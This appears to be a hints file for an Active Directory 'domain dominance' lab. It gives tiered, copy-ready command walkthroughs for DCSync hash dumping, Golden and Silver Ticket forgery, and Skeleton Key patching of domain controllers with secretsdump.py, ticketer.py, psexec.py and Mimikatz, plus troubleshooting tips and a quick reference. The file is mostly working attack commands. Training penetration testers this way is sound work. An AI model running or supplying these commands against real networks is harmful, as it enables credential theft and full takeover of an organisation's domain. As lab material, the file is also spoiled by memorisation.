# Domain Dominance Hints

Progressive hints for each domain dominance task.

---

## Task 1: DCSync Attack

### Hint 1 (Light)
DCSync requires specific rights: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All. Domain Admins have these by default. Use secretsdump.py or Mimikatz lsadump::dcsync.

### Hint 2 (Medium)
```bash
# secretsdump.py for DCSync
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc

# For specific account
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt
```

### Hint 3 (Heavy)
```bash
# Complete DCSync workflow

# === Using secretsdump.py (Linux) ===

# 1. Full domain dump (all accounts)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc

# 2. Specific user (faster, less noisy)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user Administrator

# 3. With NTLM hash instead of password
secretsdump.py domain.local/admin@dc01.domain.local -hashes :NTLM_HASH -just-dc

# 4. Save output to files
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc -outputfile domain_hashes

# Output format: username:RID:LMhash:NTLMhash
# Example: krbtgt:502:aad3b435...:a9bfd4c5c867d25e1a4afa5c29e8c61:::
```

```powershell
# === Using Mimikatz (Windows) ===

# 1. DCSync single user
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::dcsync /user:domain\Administrator

# 2. Specify domain
mimikatz # lsadump::dcsync /user:krbtgt /domain:domain.local

# 3. All users (slow, noisy)
mimikatz # lsadump::dcsync /all /csv

# Look for in output:
# * Hash NTLM: <32-character hash>
# * aes256_hmac: <64-character key>
```

---

## Task 2: Golden Ticket Attack

### Hint 1 (Light)
Golden Tickets require the krbtgt NTLM hash and Domain SID. With these, you can forge a TGT for any user, including non-existent users.

### Hint 2 (Medium)
```bash
# Get Domain SID
lookupsid.py domain.local/user:password@dc01.domain.local 0

# Create Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-X-X-X -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
```

### Hint 3 (Heavy)
```bash
# Complete Golden Ticket attack

# === Step 1: Get krbtgt hash (from DCSync) ===
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt
# Note the NTLM hash: krbtgt:502:aad3...:<KRBTGT_HASH>:::

# === Step 2: Get Domain SID ===
lookupsid.py domain.local/user:password@dc01.domain.local 0
# Output: S-1-5-21-1234567890-1234567890-1234567890

# Or with rpcclient
rpcclient -U 'domain\user%password' dc01.domain.local -c "lsaquery"

# === Step 3: Create Golden Ticket ===
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain domain.local \
  Administrator

# With Domain Admin groups
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain domain.local \
  -groups 512,513,518,519,520 \
  Administrator

# === Step 4: Use the ticket ===
export KRB5CCNAME=Administrator.ccache

# Verify
klist

# Access resources
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
smbclient //dc01.domain.local/c$ -k -no-pass
secretsdump.py -k -no-pass domain.local/Administrator@dc01.domain.local
```

```powershell
# Windows with Mimikatz

# Create Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /krbtgt:KRBTGT_HASH /ptt

# Verify
klist

# Access resources
dir \\dc01.domain.local\c$
mimikatz # lsadump::dcsync /user:krbtgt
```

---

## Task 3: Silver Ticket Attack

### Hint 1 (Light)
Silver Tickets require the target service account's hash (often a computer account). They don't contact the KDC, making them stealthier than Golden Tickets.

### Hint 2 (Medium)
```bash
# Get computer account hash
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user 'DC01$'

# Create Silver Ticket for CIFS
ticketer.py -nthash COMPUTER_HASH -domain-sid S-1-5-21-X-X-X -domain domain.local -spn CIFS/dc01.domain.local Administrator
```

### Hint 3 (Heavy)
```bash
# Complete Silver Ticket attack

# === Step 1: Get target service account hash ===
# For computer services (CIFS, HOST, LDAP, etc.) - use computer account
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user 'DC01$'
# Note: DC01$:1001:aad3...:<COMPUTER_HASH>:::

# For SQL Server - use service account
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user svc_sql

# === Step 2: Get Domain SID (if not already known) ===
lookupsid.py domain.local/user:password@dc01.domain.local 0

# === Step 3: Create Silver Ticket ===

# CIFS - File share access
ticketer.py -nthash COMPUTER_HASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain domain.local \
  -spn CIFS/dc01.domain.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
smbclient //dc01.domain.local/c$ -k -no-pass

# HOST - WMI, Scheduled Tasks, etc.
ticketer.py -nthash COMPUTER_HASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain domain.local \
  -spn HOST/dc01.domain.local \
  Administrator

# HTTP - WinRM
ticketer.py -nthash COMPUTER_HASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain domain.local \
  -spn HTTP/dc01.domain.local \
  Administrator

# === Step 4: Use the ticket ===
export KRB5CCNAME=Administrator.ccache
klist
smbclient //dc01.domain.local/c$ -k -no-pass
# or
psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
```

```powershell
# Windows with Mimikatz

# CIFS Silver Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /target:dc01.domain.local \
  /service:CIFS \
  /rc4:COMPUTER_HASH \
  /ptt

# Verify and use
klist
dir \\dc01.domain.local\c$
```

---

## Task 4: Skeleton Key Attack

### Hint 1 (Light)
Skeleton Key patches LSASS on the Domain Controller to accept a master password for any account. Original passwords continue to work.

### Hint 2 (Medium)
```powershell
# On Domain Controller with Mimikatz
mimikatz # misc::skeleton
# Default password: mimikatz
```

### Hint 3 (Heavy)
```powershell
# Complete Skeleton Key attack

# === Prerequisites ===
# - Domain Admin access
# - Remote execution on Domain Controller

# === Step 1: Get access to DC ===
# Via PsExec, WMI, or direct RDP

# === Step 2: Run Mimikatz on DC ===
mimikatz.exe

# Enable debug privileges
mimikatz # privilege::debug

# Install Skeleton Key
mimikatz # misc::skeleton
# Output: [KDC] Skeleton Key installed!

# Default skeleton password is: mimikatz
```

```bash
# === Step 3: Use skeleton key ===

# Now ANY account authenticates with "mimikatz"
# Original passwords still work

# As any user
psexec.py domain.local/Administrator:mimikatz@dc01.domain.local
psexec.py domain.local/anyuser:mimikatz@dc01.domain.local
wmiexec.py domain.local/user:mimikatz@anyserver.domain.local

# With smbclient
smbclient //dc01.domain.local/c$ -U 'domain\anyuser%mimikatz'
```

```
# === Limitations ===
# - Only works on the patched DC
# - Non-persistent (cleared on DC reboot)
# - Detectable by memory analysis
# - Must re-deploy after every DC reboot
```

---

## Troubleshooting Hints

### Time Sync Issues
```bash
# Kerberos requires time within 5 minutes
sudo ntpdate dc01.domain.local
```

### Wrong Hash Format
```
NTLM hash should be 32 hex characters
AES256 key should be 64 hex characters
Don't include the LM hash part (the first 32 chars before the colon)
```

### Ticket Not Working
```bash
# Verify ticket is loaded
klist

# Check ticket is for correct service (Silver Ticket)
# SPN in ticket must match target service

# Verify Domain SID format
# S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX (three parts after 21)
```

### Golden Ticket Expired
```
Default ticket lifetime is 10 years
If issues, try creating fresh ticket
krbtgt password may have been rotated (rare)
```

### Silver Ticket Rejected
```
Some services validate PAC with DC
Try Golden Ticket instead
Or try different service on same host
```

---

## Common Mistakes

1. **Using wrong hash** - NTLM is 32 chars, AES256 is 64 chars
2. **Wrong Domain SID format** - Must be S-1-5-21-X-X-X (three parts)
3. **Time skew** - Sync time before Kerberos operations
4. **Wrong SPN for Silver Ticket** - Must match target service exactly
5. **Forgetting to export KRB5CCNAME** - Impacket needs this set
6. **Using LM:NTLM format** - Use just NTLM hash for ticketer.py
7. **Skeleton Key on wrong DC** - Must patch the DC user authenticates to

---

## Quick Reference

### DCSync
```bash
secretsdump.py DOMAIN/admin:pass@DC -just-dc-user krbtgt
mimikatz # lsadump::dcsync /user:krbtgt
```

### Golden Ticket
```bash
# Get SID
lookupsid.py DOMAIN/user:pass@DC 0

# Create
ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass DOMAIN/Administrator@DC
```

### Silver Ticket
```bash
# Get computer hash
secretsdump.py DOMAIN/admin:pass@DC -just-dc-user 'TARGET$'

# Create
ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN -spn CIFS/TARGET Administrator
export KRB5CCNAME=Administrator.ccache
smbclient //TARGET/c$ -k -no-pass
```

### Skeleton Key
```powershell
mimikatz # misc::skeleton
# Use: any_user:mimikatz
```
